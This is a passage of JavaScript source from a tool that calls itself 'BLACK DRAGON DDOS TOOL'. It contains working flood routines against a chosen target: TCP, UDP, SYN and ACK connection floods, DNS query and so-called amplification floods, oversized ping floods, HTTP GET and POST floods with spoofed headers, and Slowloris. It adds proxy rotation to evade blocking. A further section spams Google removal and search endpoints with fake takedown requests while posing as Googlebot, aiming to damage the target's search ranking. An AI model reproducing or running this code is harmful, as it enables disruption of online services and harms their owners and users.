            CONFIG.proxyList = content.split('\n')
                .map(line => line.trim())
                .filter(line => line.length > 0 && !line.startsWith('#'))
                .map(line => {
                    // Support format: ip:port or ip:port:user:pass
                    const parts = line.split(':');
                    if (parts.length >= 2) {
                        return {
                            host: parts[0],
                            port: parseInt(parts[1]),
                            auth: parts.length >= 4 ? `${parts[2]}:${parts[3]}` : null
                        };
                    }
                    return null;
                })
                .filter(p => p !== null);
            
            log(`Loaded ${CONFIG.proxyList.length} proxies from ${CONFIG.proxyFile}`, 'INFO');
        } else {
            log(`Proxy file ${CONFIG.proxyFile} not found. Using direct connection.`, 'WARN');
        }
    } catch (e) {
        log(`Error loading proxies: ${e.message}`, 'ERROR');
        CONFIG.useProxy = false;
    }
}

function getNextProxy() {
    if (!CONFIG.useProxy || CONFIG.proxyList.length === 0) {
        return null;
    }
    
    PROXY_INDEX = (PROXY_INDEX + 1) % CONFIG.proxyList.length;
    return CONFIG.proxyList[PROXY_INDEX];
}

function createProxyAgent(url, proxy) {
    if (!proxy) return null;
    
    try {
        // Try to use proxy-agent packages if available
        let HttpsProxyAgent, HttpProxyAgent;
        try {
            HttpsProxyAgent = require('https-proxy-agent').HttpsProxyAgent;
            HttpProxyAgent = require('http-proxy-agent').HttpProxyAgent;
        } catch (e) {
            // Fallback: create basic proxy connection using net module
            log('Proxy agent packages not found. Using basic proxy support.', 'WARN');
            return createBasicProxyAgent(url, proxy);
        }
        
        const proxyUrl = proxy.auth 
            ? `http://${proxy.auth}@${proxy.host}:${proxy.port}`
            : `http://${proxy.host}:${proxy.port}`;
        
        return url.startsWith('https:') 
            ? new HttpsProxyAgent(proxyUrl)
            : new HttpProxyAgent(proxyUrl);
    } catch (e) {
        log(`Error creating proxy agent: ${e.message}`, 'ERROR');
        return null;
    }
}

function createBasicProxyAgent(url, proxy) {
    // Basic proxy support using net.Socket
    // This is a simplified version - for full proxy support, install https-proxy-agent
    return null; // Will use direct connection if proxy packages not available
}

function makeRequestWithProxy(url, options, callback) {
    const proxy = CONFIG.useProxy ? getNextProxy() : null;
    const agent = createProxyAgent(url, proxy);
    
    if (agent) {
        options.agent = agent;
    }
    
    const mod = url.startsWith('https:') ? https : http;
    return mod.request(url, options, callback);
}

function log(message, level = 'INFO') {
    if (!CONFIG.enableLogging) return;
    const timestamp = new Date().toISOString();
    const logMsg = `[${timestamp}] [${level}] ${message}`;
    console.log(logMsg);
    try {
        fs.appendFileSync(CONFIG.logFile, logMsg + '\n');
    } catch (e) {
        // Silent fail
    }
}

function updateStatsPerSecond() {
    const now = Date.now();
    const elapsed = (now - START_TIME) / 1000;
    if (elapsed > 0) {
        for (const m of METHODS) {
            STATS_PER_SEC[m] = Math.floor((STATS[m] || 0) / elapsed);
        }
    }
}

function formatBytes(bytes) {
    if (bytes === 0) return '0 B';
    const k = 1024;
    const sizes = ['B', 'KB', 'MB', 'GB'];
    const i = Math.floor(Math.log(bytes) / Math.log(k));
    return Math.round(bytes / Math.pow(k, i) * 100) / 100 + ' ' + sizes[i];
}

function formatTime(seconds) {
    const h = Math.floor(seconds / 3600);
    const m = Math.floor((seconds % 3600) / 60);
    const s = seconds % 60;
    if (h > 0) return `${h}h ${m}m ${s}s`;
    if (m > 0) return `${m}m ${s}s`;
    return `${s}s`;
}

// ==================== STATISTICS & MONITORING ====================

function logStatus(target, port) {
    if (!ATTACK_RUNNING || CLEANUP_IN_PROGRESS) return;
    
    updateStatsPerSecond();
    const runtime = Math.floor((Date.now() - START_TIME) / 1000);
    const totalMethods = METHODS.filter(m => (STATS[m] || 0) > 0).length;
    const avgPacketsPerSec = Math.floor(TOTAL_PACKETS / (runtime || 1));
    
    process.stdout.write("\x1b[2J\x1b[0f");
    
    // Show BLACK DRAGON logo at top
    console.log('\x1b[31m'); // Red color
    console.log('╔════════════════════════════════════════════════════════════╗');
    console.log('║          🐉  BLACK DRAGON DDOS TOOL v2.0  🐉              ║');
    console.log('╚════════════════════════════════════════════════════════════╝');
    console.log('\x1b[0m'); // Reset color
    
    console.log("╔════════════════════════════════════════════════════════════╗");
    console.log("║     ⚡  ADVANCED DDOS ALL-IN-ONE POWER TOOL v2.0  ⚡      ║");
    console.log("╠════════════════════════════════════════════════════════════╣");
    const totalThreads = INTERVALS.length;
    const activeSockets = SOCKETS.length;
    console.log("║ Target         :", target.substring(0, 40).padEnd(40));
    console.log("║ Port           :", `${port}`.padEnd(40));
    console.log("║ Runtime        :", formatTime(runtime).padEnd(40));
    console.log("║ Intensity      :", CONFIG.intensity.toUpperCase().padEnd(40));
    console.log("║ Active Threads :", totalThreads.toLocaleString().padEnd(40));
    console.log("║ Active Sockets :", activeSockets.toLocaleString().padEnd(40));
    console.log("║ Active Methods :", `${totalMethods}/${METHODS.length}`.padEnd(40));
    console.log("║ Total Packets  :", TOTAL_PACKETS.toLocaleString().padEnd(40));
    console.log("║ Total Data     :", formatBytes(TOTAL_BYTES).padEnd(40));
    console.log("║ Avg Packets/s  :", avgPacketsPerSec.toLocaleString().padEnd(40));
    
    // Memory monitoring
    const memUsage = process.memoryUsage();
    const memMB = Math.floor(memUsage.heapUsed / 1024 / 1024);
    const memTotalMB = Math.floor(memUsage.heapTotal / 1024 / 1024);
    const rampUpStatus = `${RAMP_UP_COUNT}/${RAM_CONFIG.maxRampUp}`;
    const socketUsage = `${SOCKETS.length}/${RAM_CONFIG.maxSockets}`;
    const socketPercent = Math.floor((SOCKETS.length / RAM_CONFIG.maxSockets) * 100);
    
    console.log("╠════════════════════════════════════════════════════════════╣");
    console.log("║ 🧠 RAM MANAGEMENT STATUS:".padEnd(60));
    console.log("╠════════════════════════════════════════════════════════════╣");
    console.log("║ Memory Usage    :", `${memMB} MB / ${memTotalMB} MB`.padEnd(40));
    console.log("║ Socket Usage    :", `${socketUsage} (${socketPercent}%)`.padEnd(40));
    console.log("║ Ramp Up Level   :", rampUpStatus.padEnd(40));
    console.log("║ Auto-Scaling    :", (RAM_CONFIG.autoScaleEnabled ? "ENABLED" : "DISABLED").padEnd(40));
    console.log("╠════════════════════════════════════════════════════════════╣");
    
    // Show top 10 methods by packets
    const sortedMethods = METHODS
        .map(m => ({ name: m, count: STATS[m] || 0, pps: STATS_PER_SEC[m] || 0 }))
        .filter(m => m.count > 0)
        .sort((a, b) => b.count - a.count)
        .slice(0, 10);
    
    console.log("║ Top Attack Methods (by packets):".padEnd(60));
    console.log("╠════════════════════════════════════════════════════════════╣");
    sortedMethods.forEach((m, idx) => {
        const name = `${idx + 1}. ${m.name}`.padEnd(20);
        const total = m.count.toLocaleString().padEnd(12);
        const pps = `${m.pps} p/s`.padEnd(10);
        console.log(`║ ${name} ${total} | ${pps}`);
    });
    
    console.log("╚════════════════════════════════════════════════════════════╝");
    console.log('\x1b[33m'); // Yellow color
    console.log("⚠️  Press Ctrl+C to stop attack.");
    console.log('\x1b[0m'); // Reset color
    
    // Save stats history
    if (runtime % 10 === 0) {
        STATS_HISTORY.push({
            time: runtime,
            totalPackets: TOTAL_PACKETS,
            totalBytes: TOTAL_BYTES,
            methods: { ...STATS }
        });
    }
}

// ==================== LAYER 3 ATTACKS ====================

function stressLayer3TCP(target, port) {
    if (!ATTACK_RUNNING) return;
    const multiplier = getIntensityMultiplier();
    const threads = CONFIG.threads[CONFIG.intensity].tcp * multiplier;
    
    for (let t = 0; t < threads; t++) {
        const intervalId = setInterval(() => {
            if (!ATTACK_RUNNING) {
                clearInterval(intervalId);
                return;
            }
            try {
                const batchSize = 1000;
                for (let i = 0; i < batchSize; i++) {
                    if (!ATTACK_RUNNING) break;
                    const sock = new net.Socket();
                    sock.setTimeout(500);
                    sock.setNoDelay(true);
                    sock.connect(port, target, () => {
                        sock.write(Buffer.alloc(CONFIG.packetSize.tcp, randomString()));
                        sock.write(Buffer.alloc(CONFIG.packetSize.tcp, randomString()));
                        sock.end();
                    });
                    sock.on('error', () => {
                        try { sock.destroy(); } catch {}
                    });
                    sock.on('timeout', () => {
                        try { sock.destroy(); } catch {}
                    });
                    SOCKETS.push(sock);
                }
                STATS["L3-TCP"] = (STATS["L3-TCP"] || 0) + batchSize;
                TOTAL_PACKETS += batchSize;
                TOTAL_BYTES += batchSize * CONFIG.packetSize.tcp * 2;
            } catch (e) {
                // Silent fail
            }
        }, 1);
        INTERVALS.push(intervalId);
        THREAD_POOLS.l3tcp.push(intervalId);
    }
}

function stressLayer3UDP(target, port) {
    if (!ATTACK_RUNNING) return;
    const multiplier = getIntensityMultiplier();
    const threads = CONFIG.threads[CONFIG.intensity].udp * multiplier;
    
    for (let t = 0; t < threads; t++) {
        const client = dgram.createSocket('udp4');
        SOCKETS.push(client);
        const intervalId = setInterval(() => {
            if (!ATTACK_RUNNING) {
                clearInterval(intervalId);
                try { client.close(); } catch {}
                return;
            }
            try {
                const batchSize = 1000;
                for (let i = 0; i < batchSize; i++) {
                    if (!ATTACK_RUNNING) break;
                    const msg = Buffer.alloc(CONFIG.packetSize.udp, randomString());
                    client.send(msg, 0, msg.length, port, target, () => {});
                    client.send(msg, 0, msg.length, port, target, () => {});
                }
                STATS["L3-UDP"] = (STATS["L3-UDP"] || 0) + batchSize * 2;
                TOTAL_PACKETS += batchSize * 2;
                TOTAL_BYTES += batchSize * CONFIG.packetSize.udp * 2;
            } catch (e) {
                // Silent fail
            }
        }, 1);
        INTERVALS.push(intervalId);
        THREAD_POOLS.l3udp.push(intervalId);
    }
}

function stressLayer3SYN(target, port) {
    if (!ATTACK_RUNNING) return;
    const multiplier = getIntensityMultiplier();
    const threads = CONFIG.threads[CONFIG.intensity].tcp * multiplier;
    
    for (let t = 0; t < threads; t++) {
        const intervalId = setInterval(() => {
            if (!ATTACK_RUNNING) {
                clearInterval(intervalId);
                return;
            }
            try {
                const batchSize = 300;
                for (let i = 0; i < batchSize; i++) {
                    if (!ATTACK_RUNNING) break;
                    const sock = new net.Socket();
                    sock.setTimeout(500);
                    sock.connect(port, target, () => {
                        // Don't send ACK, leave connection half-open (SYN flood)
                        // Connection will timeout
                    });
                    sock.on('error', () => {
                        try { sock.destroy(); } catch {}
                    });
                    sock.on('timeout', () => {
                        try { sock.destroy(); } catch {}
                    });
                    SOCKETS.push(sock);
                }
                STATS["L3-SYN"] = (STATS["L3-SYN"] || 0) + batchSize;
                TOTAL_PACKETS += batchSize;
            } catch (e) {
                // Silent fail
            }
        }, 1);
        INTERVALS.push(intervalId);
        THREAD_POOLS.l3syn.push(intervalId);
    }
}

function stressLayer3ACK(target, port) {
    if (!ATTACK_RUNNING) return;
    const multiplier = getIntensityMultiplier();
    const threads = CONFIG.threads[CONFIG.intensity].tcp * multiplier;
    
    for (let t = 0; t < threads; t++) {
        const intervalId = setInterval(() => {
            if (!ATTACK_RUNNING) {
                clearInterval(intervalId);
                return;
            }
            try {
                const batchSize = 400;
                for (let i = 0; i < batchSize; i++) {
                    if (!ATTACK_RUNNING) break;
                    const sock = new net.Socket();
                    sock.setTimeout(1000);
                    sock.connect(port, target, () => {
                        // Send ACK without proper handshake
                        sock.write(Buffer.alloc(CONFIG.packetSize.tcp, 'A'));
                        sock.write(Buffer.alloc(CONFIG.packetSize.tcp, 'A'));
                        sock.destroy();
                    });
                    sock.on('error', () => {
                        try { sock.destroy(); } catch {}
                    });
                    SOCKETS.push(sock);
                }
                STATS["L3-ACK"] = (STATS["L3-ACK"] || 0) + batchSize;
                TOTAL_PACKETS += batchSize;
                TOTAL_BYTES += batchSize * CONFIG.packetSize.tcp * 2;
            } catch (e) {
                // Silent fail
            }
        }, 1);
        INTERVALS.push(intervalId);
        THREAD_POOLS.l3ack.push(intervalId);
    }
}

// ==================== LAYER 4 ATTACKS ====================

function stressLayer4TCP(target, port) {
    if (!ATTACK_RUNNING) return;
    const multiplier = getIntensityMultiplier();
    const threads = CONFIG.threads[CONFIG.intensity].tcp * multiplier;
    
    for (let t = 0; t < threads; t++) {
        const intervalId = setInterval(() => {
            if (!ATTACK_RUNNING) {
                clearInterval(intervalId);
                return;
            }
            try {
                const batchSize = 600;
                for (let i = 0; i < batchSize; i++) {
                    if (!ATTACK_RUNNING) break;
                    const sock = new net.Socket();
                    sock.setTimeout(1000);
                    sock.setNoDelay(true);
                    sock.connect(port, target, () => {
                        const data = Buffer.alloc(CONFIG.packetSize.tcp, randomString());
                        sock.write(data);
                        sock.write(data);
                        sock.write(data);
                        sock.end();
                    });
                    sock.on('error', () => {
                        try { sock.destroy(); } catch {}
                    });
                    sock.on('timeout', () => {
                        try { sock.destroy(); } catch {}
                    });
                    SOCKETS.push(sock);
                }
                STATS["L4-TCP"] = (STATS["L4-TCP"] || 0) + batchSize;
                TOTAL_PACKETS += batchSize;
                TOTAL_BYTES += batchSize * CONFIG.packetSize.tcp * 3;
            } catch (e) {
                // Silent fail
            }
        }, 1);
        INTERVALS.push(intervalId);
        THREAD_POOLS.l4tcp.push(intervalId);
    }
}

function stressLayer4UDP(target, port) {
    if (!ATTACK_RUNNING) return;
    const multiplier = getIntensityMultiplier();
    const threads = CONFIG.threads[CONFIG.intensity].udp * multiplier;
    
    for (let t = 0; t < threads; t++) {
        const client = dgram.createSocket('udp4');
        SOCKETS.push(client);
        const intervalId = setInterval(() => {
            if (!ATTACK_RUNNING) {
                clearInterval(intervalId);
                try { client.close(); } catch {}
                return;
            }
            try {
                const batchSize = 1500;
                for (let i = 0; i < batchSize; i++) {
                    if (!ATTACK_RUNNING) break;
                    const msg = Buffer.alloc(CONFIG.packetSize.udp, randomString());
                    client.send(msg, 0, msg.length, port, target, () => {});
                    client.send(msg, 0, msg.length, port, target, () => {});
                    client.send(msg, 0, msg.length, port, target, () => {});
                }
                STATS["L4-UDP"] = (STATS["L4-UDP"] || 0) + batchSize * 3;
                TOTAL_PACKETS += batchSize * 3;
                TOTAL_BYTES += batchSize * CONFIG.packetSize.udp * 3;
            } catch (e) {
                // Silent fail
            }
        }, 1);
        INTERVALS.push(intervalId);
        THREAD_POOLS.l4udp.push(intervalId);
    }
}

// ==================== LAYER 5 ATTACKS ====================

function stressDNS(target) {
    if (!ATTACK_RUNNING) return;
    const multiplier = getIntensityMultiplier();
    const threads = CONFIG.threads[CONFIG.intensity].dns * multiplier;
    
    for (let t = 0; t < threads; t++) {
        const intervalId = setInterval(() => {
            if (!ATTACK_RUNNING) {
                clearInterval(intervalId);
                return;
            }
            try {
                const batchSize = 20;
                for (let i = 0; i < batchSize; i++) {
                    if (!ATTACK_RUNNING) break;
                    const dname = randomString(8) + '.' + target;
                    dns.lookup(dname, { timeout: CONFIG.timeouts.dns }, () => {});
                    // Also try resolve4
                    dns.resolve4(dname, { timeout: CONFIG.timeouts.dns }, () => {});
                }
                STATS["L5-DNS"] = (STATS["L5-DNS"] || 0) + batchSize * 2;
                TOTAL_PACKETS += batchSize * 2;
            } catch (e) {
                // Silent fail
            }
        }, 200 + Math.random() * 100);
        INTERVALS.push(intervalId);
        THREAD_POOLS.dns.push(intervalId);
    }
}

function stressDNSAmplification(target) {
    if (!ATTACK_RUNNING) return;
    const dnsServers = ['8.8.8.8', '1.1.1.1', '208.67.222.222', '9.9.9.9'];
    const multiplier = getIntensityMultiplier();
    
    for (let t = 0; t < multiplier * 10; t++) {
        const intervalId = setInterval(() => {
            if (!ATTACK_RUNNING) {
                clearInterval(intervalId);
                return;
            }
            try {
                const client = dgram.createSocket('udp4');
                const dnsServer = dnsServers[Math.floor(Math.random() * dnsServers.length)];
                const query = Buffer.alloc(512, randomString());
                client.send(query, 0, query.length, 53, dnsServer, () => {
                    try { client.close(); } catch {}
                });
                STATS["L5-DNS-AMP"] = (STATS["L5-DNS-AMP"] || 0) + 1;
                TOTAL_PACKETS += 1;
            } catch (e) {
                // Silent fail
            }
        }, 100 + Math.random() * 50);
        INTERVALS.push(intervalId);
        THREAD_POOLS.dnsAmp.push(intervalId);
    }
}

// ==================== LAYER 6 ATTACKS ====================

function stressPing(target) {
    if (!ATTACK_RUNNING) return;
    const pingCmd = IS_WINDOWS 
        ? `ping -n 4 -l 65500 ${target}`
        : `ping -c 4 -s 65507 ${target}`;
    const multiplier = getIntensityMultiplier();
    
    for (let t = 0; t < multiplier * 5; t++) {
        const intervalId = setInterval(() => {
            if (!ATTACK_RUNNING) {
                clearInterval(intervalId);
                return;
            }
            try {
                execSync(pingCmd, { timeout: 8000, stdio: 'ignore' });
                STATS["L6-PING"] = (STATS["L6-PING"] || 0) + 4;
                TOTAL_PACKETS += 4;
                TOTAL_BYTES += 4 * 65500;
            } catch (e) {
                // Silent fail
            }
        }, 2000 + Math.random() * 1000);
        INTERVALS.push(intervalId);
    }
}

// ==================== LAYER 7 ATTACKS ====================

function stressHTTPFlood(target) {
    if (!ATTACK_RUNNING) return;
    if (!target.startsWith('http://') && !target.startsWith('https://')) {
        return;
    }
    
    const multiplier = getIntensityMultiplier();
    const threads = CONFIG.threads[CONFIG.intensity].http * multiplier;
    
    for (let t = 0; t < threads; t++) {
        const intervalId = setInterval(() => {
            if (!ATTACK_RUNNING) {
                clearInterval(intervalId);
                return;
            }
            try {
                const batchSize = 500;
                for (let i = 0; i < batchSize; i++) {
                    if (!ATTACK_RUNNING) break;
                    const opts = {
                        method: 'GET',
                        timeout: 2000,
                        headers: {
                            'User-Agent': getRandomUserAgent(),
                            'Accept': '*/*',
                            'Accept-Language': 'en-US,en;q=0.9',
                            'Accept-Encoding': 'gzip, deflate, br',
                            'Referer': getRandomReferer(),
                            'X-Forwarded-For': randomIp(),
                            'X-Real-IP': randomIp(),
                            'Connection': 'close',
                            'Cache-Control': 'no-cache',
                            'Pragma': 'no-cache'
                        }
                    };
                    const mod = target.startsWith('https:') ? https : http;
                    const req = mod.request(target, opts, res => {
                        res.on('data', () => {});
                        res.on('end', () => {});
                    });
                    req.on('error', () => {});
                    req.setTimeout(2000, () => {
                        try { req.destroy(); } catch {}
                    });
                    req.end();
                }
                STATS["L7-HTTP"] = (STATS["L7-HTTP"] || 0) + batchSize;
                STATS["L7-HTTPS"] = (target.startsWith('https:') ? (STATS["L7-HTTPS"] || 0) + batchSize : STATS["L7-HTTPS"] || 0);
                TOTAL_PACKETS += batchSize;
            } catch (e) {
                // Silent fail
            }
        }, 1);
        INTERVALS.push(intervalId);
        THREAD_POOLS.l7http.push(intervalId);
    }
}

function stressHTTPPOST(target) {
    if (!ATTACK_RUNNING) return;
    if (!target.startsWith('http://') && !target.startsWith('https://')) {
        return;
    }
    
    const multiplier = getIntensityMultiplier();
    const threads = CONFIG.threads[CONFIG.intensity].http * multiplier;
    
    for (let t = 0; t < threads; t++) {
        const intervalId = setInterval(() => {
            if (!ATTACK_RUNNING) {
                clearInterval(intervalId);
                return;
            }
            try {
                const batchSize = 400;
                for (let i = 0; i < batchSize; i++) {
                    if (!ATTACK_RUNNING) break;
                    const body = Buffer.alloc(CONFIG.packetSize.http, randomString());
                    const opts = {
                        method: 'POST',
                        timeout: 2000,
                        headers: {
                            'User-Agent': getRandomUserAgent(),
                            'Content-Type': 'application/x-www-form-urlencoded',
                            'Content-Length': body.length,
                            'Accept': '*/*',
                            'Referer': getRandomReferer(),
                            'X-Forwarded-For': randomIp(),
                            'Connection': 'close'
                        }
                    };
                    const mod = target.startsWith('https:') ? https : http;
                    const req = mod.request(target, opts, res => {
                        res.on('data', () => {});
                        res.on('end', () => {});
                    });
                    req.on('error', () => {});
                    req.setTimeout(2000, () => {
                        try { req.destroy(); } catch {}
                    });
                    req.write(body);
                    req.end();
                }
                STATS["L7-POST"] = (STATS["L7-POST"] || 0) + batchSize;
                TOTAL_PACKETS += batchSize;
                TOTAL_BYTES += batchSize * CONFIG.packetSize.http;
            } catch (e) {
                // Silent fail
            }
        }, 1);
        INTERVALS.push(intervalId);
    }
}

function stressSlowloris(target) {
    if (!ATTACK_RUNNING) return;
    if (!target.startsWith('http://') && !target.startsWith('https://')) {
        return;
    }
    
    const multiplier = getIntensityMultiplier();
    const threads = CONFIG.threads[CONFIG.intensity].http * multiplier * 5;
    
    for (let t = 0; t < threads; t++) {
        const intervalId = setInterval(() => {
            if (!ATTACK_RUNNING) {
                clearInterval(intervalId);
                return;
            }
            try {
                const batchSize = 100;
                for (let i = 0; i < batchSize; i++) {
                    if (!ATTACK_RUNNING) break;
                    const mod = target.startsWith('https:') ? https : http;
                    const req = mod.request(target, {
                        method: 'GET',
                        headers: {
                            'User-Agent': getRandomUserAgent(),
                            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                            'Accept-Language': 'en-US,en;q=0.5',
                            'Accept-Encoding': 'gzip, deflate',
                            'Connection': 'keep-alive',
                            'X-Forwarded-For': randomIp()
                        }
                    });
                    
                    // Keep connection open (Slowloris attack)
                    req.on('error', () => {});
                    req.setTimeout(60000, () => {
                        try { req.destroy(); } catch {}
                    });
                    req.end();
                }
                STATS["SLOWLORIS"] = (STATS["SLOWLORIS"] || 0) + batchSize;
                TOTAL_PACKETS += batchSize;
            } catch (e) {
                // Silent fail
            }
        }, 1);
        INTERVALS.push(intervalId);
        THREAD_POOLS.slowloris.push(intervalId);
    }
}

// ==================== DE-INDEXING FUNCTIONS ====================

function stressDeIndex(target) {
    if (!ATTACK_RUNNING || !CONFIG.enableDeIndex) return;
    if (!target.startsWith('http://') && !target.startsWith('https://')) {
        return;
    }
    
    const multiplier = getIntensityMultiplier();
    const threads = CONFIG.threads[CONFIG.intensity].http * multiplier * 5; // 5x lebih agresif
    
    const baseUrl = target.replace(/\/$/, '');
    const domain = baseUrl.replace(/^https?:\/\//, '').split('/')[0];
    
    // Google Search Console de-index URLs - EXTREME
    const deIndexUrls = [
        `https://www.google.com/webmasters/tools/removals?siteUrl=${encodeURIComponent(target)}`,
        `https://search.google.com/search-console/removals?resourceUrl=${encodeURIComponent(target)}`,
        `https://www.google.com/ping?sitemap=${encodeURIComponent(target + '/sitemap.xml')}`,
        `https://www.bing.com/webmasters/ping?sitemap=${encodeURIComponent(target + '/sitemap.xml')}`,
        `https://www.google.com/search?q=site:${domain}`,
        `https://www.google.com/search?q=${encodeURIComponent(domain)}`,
        `https://search.google.com/search-console/removals`,
        `https://www.google.com/webmasters/tools/removals`
    ];
    
    // AGGRESSIVE: Spam Google with removal requests - 100x lebih banyak
    for (let t = 0; t < threads; t++) {
        const intervalId = setInterval(() => {
            if (!ATTACK_RUNNING) {
                clearInterval(intervalId);
                return;
            }
            try {
                const batchSize = 500; // 25x lebih banyak
                for (let i = 0; i < batchSize; i++) {
                    if (!ATTACK_RUNNING) break;
                    
                    // Spam Google Search Console removal requests
                    const url = deIndexUrls[Math.floor(Math.random() * deIndexUrls.length)];
                    const opts = {
                        method: 'GET',
                        timeout: 1000,
                        headers: {
                            'User-Agent': 'Googlebot/2.1 (+http://www.google.com/bot.html)',
                            'Accept': '*/*',
                            'Referer': 'https://www.google.com/',
                            'X-Forwarded-For': randomIp(),
                            'Accept-Language': 'en-US,en;q=0.9'
                        }
                    };
                    
                    const mod = url.startsWith('https:') ? https : http;
                    const req = mod.request(url, opts, res => {
                        res.on('data', () => {});
                        res.on('end', () => {});
                    });
                    req.on('error', () => {});
                    req.setTimeout(1000, () => { try { req.destroy(); } catch {} });
                    req.end();
                    
                    // Spam robots.txt dengan fake disallow
                    const robotsUrl = baseUrl + '/robots.txt';
                    const robotsReq = (robotsUrl.startsWith('https:') ? https : http).request(robotsUrl, {
                        method: 'GET',
                        timeout: 1000,
                        headers: {
                            'User-Agent': 'Googlebot/2.1 (+http://www.google.com/bot.html)',
                            'Accept': '*/*'
                        }
                    }, res => {
                        res.on('data', () => {});
                        res.on('end', () => {});
                    });
                    robotsReq.on('error', () => {});
                    robotsReq.setTimeout(1000, () => { try { robotsReq.destroy(); } catch {} });
                    robotsReq.end();
                    
                    // Spam sitemap dengan fake URLs
                    const fakeSitemapUrl = `https://www.google.com/ping?sitemap=${encodeURIComponent(baseUrl + '/sitemap' + randomString(10) + '.xml')}`;
                    const sitemapReq = https.request(fakeSitemapUrl, {
                        method: 'GET',
                        timeout: 1000,
                        headers: {
                            'User-Agent': 'Googlebot/2.1 (+http://www.google.com/bot.html)',
                            'Accept': '*/*'
                        }
                    }, res => {
                        res.on('data', () => {});
                        res.on('end', () => {});
                    });
                    sitemapReq.on('error', () => {});
                    sitemapReq.setTimeout(1000, () => { try { sitemapReq.destroy(); } catch {} });
                    sitemapReq.end();
                }
                STATS["DE-INDEX"] = (STATS["DE-INDEX"] || 0) + batchSize * 3;
                TOTAL_PACKETS += batchSize * 3;
            } catch (e) {
                // Silent fail
            }
        }, 1); // 200x lebih cepat
        INTERVALS.push(intervalId);
    }
    
    // EXTREME: Spam Google dengan fake DMCA takedown requests
    for (let t = 0; t < threads * 2; t++) {
        const intervalId = setInterval(() => {
            if (!ATTACK_RUNNING) {
                clearInterval(intervalId);
                return;
            }
            try {
                const batchSize = 300;
                for (let i = 0; i < batchSize; i++) {
                    if (!ATTACK_RUNNING) break;
                    
                    // Fake DMCA takedown request URLs
                    const dmcaUrls = [
                        `https://www.google.com/webmasters/tools/removals?siteUrl=${encodeURIComponent(target)}&reason=dmca`,
                        `https://search.google.com/search-console/removals?resourceUrl=${encodeURIComponent(target)}&reason=copyright`,
                        `https://support.google.com/legal/troubleshooter/1114905?hl=en&url=${encodeURIComponent(target)}`
                    ];
                    
                    const url = dmcaUrls[Math.floor(Math.random() * dmcaUrls.length)];
                    const req = https.request(url, {
                        method: 'GET',
                        timeout: 1000,
                        headers: {
                            'User-Agent': 'Mozilla/5.0 (compatible; Googlebot/2.1)',
                            'Accept': '*/*',
                            'Referer': 'https://www.google.com/',
                            'X-Forwarded-For': randomIp()
                        }
                    }, res => {
                        res.on('data', () => {});
                        res.on('end', () => {});
                    });
                    req.on('error', () => {});
                    req.setTimeout(1000, () => { try { req.destroy(); } catch {} });
                    req.end();
                }
                STATS["DE-INDEX"] = (STATS["DE-INDEX"] || 0) + batchSize;
                TOTAL_PACKETS += batchSize;
            } catch (e) {
                // Silent fail
            }
        }, 1);
        INTERVALS.push(intervalId);
    }
    
    // DESTROY SEO: Spam dengan fake negative signals
    for (let t = 0; t < threads; t++) {
        const intervalId = setInterval(() => {
            if (!ATTACK_RUNNING) {
                clearInterval(intervalId);
                return;
            }
            try {
                const batchSize = 400;
                for (let i = 0; i < batchSize; i++) {
                    if (!ATTACK_RUNNING) break;
                    
                    // Spam dengan fake Google search queries yang negatif
                    const negativeQueries = [
                        `https://www.google.com/search?q=${encodeURIComponent(domain + ' scam')}`,
                        `https://www.google.com/search?q=${encodeURIComponent(domain + ' fake')}`,
                        `https://www.google.com/search?q=${encodeURIComponent(domain + ' malware')}`,
                        `https://www.google.com/search?q=${encodeURIComponent(domain + ' virus')}`,
                        `https://www.google.com/search?q=${encodeURIComponent(domain + ' phishing')}`
                    ];
                    
                    const url = negativeQueries[Math.floor(Math.random() * negativeQueries.length)];
                    const req = https.request(url, {
                        method: 'GET',
                        timeout: 1000,
                        headers: {
                            'User-Agent': getRandomUserAgent(),
                            'Accept': '*/*',
                            'Referer': 'https://www.google.com/'
                        }
                    }, res => {
                        res.on('data', () => {});
                        res.on('end', () => {});
                    });
                    req.on('error', () => {});
                    req.setTimeout(1000, () => { try { req.destroy(); } catch {} });
                    req.end();
                }
                STATS["DE-INDEX"] = (STATS["DE-INDEX"] || 0) + batchSize;
                TOTAL_PACKETS += batchSize;
            } catch (e) {
                // Silent fail
            }
        }, 1);
        INTERVALS.push(intervalId);
    }
}

// ==================== CRAWLER FUNCTIONS ====================

function extractUrls(html, baseUrl) {
    const urls = new Set();
    try {
        // Extract href links
        const hrefRegex = /href=["']([^"']+)["']/gi;
        let match;
        while ((match = hrefRegex.exec(html)) !== null) {
            let url = match[1];
            if (url.startsWith('/')) {
                url = baseUrl + url;
            } else if (!url.startsWith('http')) {
                url = baseUrl + '/' + url;
            }
            if (url.startsWith('http')) {
                urls.add(url);
            }
        }
        
        // Extract src links
        const srcRegex = /src=["']([^"']+)["']/gi;
        while ((match = srcRegex.exec(html)) !== null) {
            let url = match[1];
            if (url.startsWith('/')) {
                url = baseUrl + url;
            } else if (!url.startsWith('http')) {
                url = baseUrl + '/' + url;
            }
            if (url.startsWith('http')) {
                urls.add(url);
            }
        }
    } catch (e) {
        // Silent fail
    }
    return Array.from(urls);
}

function stressCrawler(target) {
    if (!ATTACK_RUNNING || !CONFIG.enableCrawler) return;
    if (!target.startsWith('http://') && !target.startsWith('https://')) {
        return;
    }
    
    const multiplier = getIntensityMultiplier();
    const threads = CONFIG.crawlerThreads * multiplier;
    const baseUrl = target.replace(/\/$/, '');
    
    // Common paths to crawl
    const commonPaths = [
        '', '/', '/index.html', '/index.php', '/home', '/main',
        '/about', '/contact', '/blog', '/news', '/articles',
        '/products', '/services', '/pages', '/posts',
        '/sitemap.xml', '/robots.txt', '/feed', '/rss',
        '/api', '/api/v1', '/api/v2', '/admin', '/dashboard'
    ];
    
    // Initialize with base URLs
    commonPaths.forEach(path => {
        CRAWLED_URLS.add(baseUrl + path);
    });
    
    // Aggressive crawler that exhausts content
    for (let t = 0; t < threads; t++) {
        const intervalId = setInterval(() => {
            if (!ATTACK_RUNNING) {
                clearInterval(intervalId);
                return;
            }
            try {
                const batchSize = 10;
                for (let i = 0; i < batchSize; i++) {
                    if (!ATTACK_RUNNING) break;
                    
                    // Get random URL from crawled set or generate new
                    let url;
                    if (CRAWLED_URLS.size > 0 && Math.random() > 0.3) {
                        const urls = Array.from(CRAWLED_URLS);
                        url = urls[Math.floor(Math.random() * urls.length)];
                    } else {
                        // Generate new URL
                        const path = '/' + randomString(8) + (Math.random() > 0.5 ? '.html' : '');
                        url = baseUrl + path;
                        CRAWLED_URLS.add(url);
                    }
                    
                    const proxy = CONFIG.useProxy ? getNextProxy() : null;
                    const agent = createProxyAgent(url, proxy);
